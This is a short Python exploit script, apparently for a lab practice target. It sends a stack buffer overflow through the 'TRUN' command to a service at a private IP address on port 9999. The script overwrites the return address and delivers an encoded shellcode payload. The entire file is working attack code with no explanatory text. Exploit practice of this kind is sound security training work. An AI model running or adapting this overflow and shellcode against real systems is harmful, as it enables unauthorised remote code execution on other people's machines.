#!/usr/bin/python
import socket
server = '192.168.32.130'
sport = 9999

buf =  ""
buf += "\xda\xdd\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x61\xbf\xb8"
buf += "\x82\x65\xb2\x31\x7a\x1a\x03\x7a\x1a\x83\xea\xfc\xe2"
buf += "\x4d\x5f\xa1\x6b\xd9\x44\xde\x33\x0d\x5f\x43\xe2\x15"
buf += "\x74\xb5\x4b\xfe\x09\xad\x50\x31\x76\x3d\xaa\x65\x4f"
buf += "\xfe\xf7\x9f\x91\x0b\x98\x72\xd7\xac\x99\x09\xf0\x13"
buf += "\x74\x5f\xe9\xe2\xc1\xfe\x74\x19\x28\x2e\x1a\xd9\x2e"
buf += "\xa2\xad\x2f\x42\xfc\x0d\x4f\x3b\xbc\x7f\xc7\xb5\x67"
buf += "\x80\xa8\xf5\x47\x0a\xcb\x9c\x26\x1d\xc1\x4f\x19\x31"
buf += "\x0c\x2c\x65\x9a\xbb\x33\x2d\x11\x4e\x89\x0d\xc8\x86"
buf += "\x71\x70\x28\x44\x3e\x85\x3f\xf0\x3a\xdd\x2f\xe4\xd0"
buf += "\x9f\x8a\xc0\x45\xff\x74\x18\x03\x99\x9d\xe1\xff\xfa"
buf += "\x55\xb8\x44\x75\xff\x8d\x4d\xcb\x32\x21\x08\x74\x36"
buf += "\x4c\x3a\xeb\x1b\xa1\x96\xc1\x65\x35\x82\xfe\x41\x2e"
buf += "\x07\xcf\xd6\x4c\xf5\x7f\xd3\x3d\x33\xf6\xda\x38\xcd"
buf += "\xeb\x45\xfc\xc7\x14\x1e\xbc\x92\x0d\x66\xb5\x7e\xe2"
buf += "\x08\x30\x84\x92\x13\xf3\x3d\x84\xd3\x4b\xc8\x34\x4a"
buf += "\x05\x63\x49\x8e\x81\xb4\xef\x65\xf4\x12\xf4\x27\x5c"
buf += "\x75\xca\xc9\x0b\xae\xf5\x98\x45\xf0\x17\x6a\x29\x82"
buf += "\x01\x3a\x99\x82\x52\x7a\xdc\x09\x4e\xe7\xec\xc1\x06"
buf += "\x8f\xd0\xae\x7f\x03\x0c\x51\x3b\x0b\xf2\x2b\x10\xf0"
buf += "\xbf\xca\xc9\x5c\x95\xee\x5c\xce\x01\x50\x7d\xe2\x1c"
buf += "\xf6\xd4\xb8\x75\x83\xc1\x0f\xf7\xdb\x1e\xd9\xe7\xcd"
buf += "\x9b\xec\x50\x3f\x11\x90\x20\x32\x78\x87\x70\xaa\xa0"
buf += "\x7f\x48\x52\xaf\x18\xf4\x8f\xbb\xb8\x6d\x48\x3a\x6e"
buf += "\xf5\x23\xe8\x69\xd3\xa9\xe4\xb8\x07\x22\x50\xe9\x16"
buf += "\x1b\x66\x76\x0d\xff\x4a\x7a\x73\xf1\xe6\x38\xcf\xf5"
buf += "\xb2\x3d\x37\x19\xe1\x78\x76\x5b\x53\x45\x33\x06\x7d"
buf += "\xef\x41\x3c\x2f\x61\x87\x7f\x7a\xde\x96\x17\x54\x47"
buf += "\xfd\x2e\x8b\x3a\xb4\x5b\xd1\x80\x45\x8a\xdb\x2c\x14"
buf += "\x36\xf4\xde\xdb\xec\x72\x10\xdc\x2b\x6e\x1f\x02\xe8"
buf += "\x36\x0d\xac\x3a\x31\x1f\x03\xbf\x36\xc4\x10\xfe\x0e"
buf += "\x7a\xd0\xf5\x8a\x2b\xb8\xe0\xc8\xff\x46\x22"



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

eip='\xaf\x11\x50\x62'

Stop = '\xCC'*16
padding = 'F' * (3000 - 2006 - 4 -32 -len(buf))

attack= 'A'*2001+'1111'+eip+Stop+buf+padding
s.send(('TRUN .'+' '+attack+'\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
